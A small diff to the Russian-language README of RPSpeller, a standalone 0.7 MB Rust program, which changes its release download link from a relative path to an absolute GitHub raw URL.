@@ -5,7 +5,7 @@
 
 Один файл `RPSpeller.exe` на 0,7 МБ, ничего устанавливать не нужно. Написана на Rust.
 
-**Скачать:** [`releases/RPSpeller-0.3.0.zip`](../../releases/RPSpeller-0.3.0.zip) — программа и самопроверка для своего компьютера.
+**Скачать:** [`releases/RPSpeller-0.3.0.zip`](https://github.com/splithillz/one/raw/main/releases/RPSpeller-0.3.0.zip) — программа и самопроверка для своего компьютера.
 
 ## Как пользоваться
 
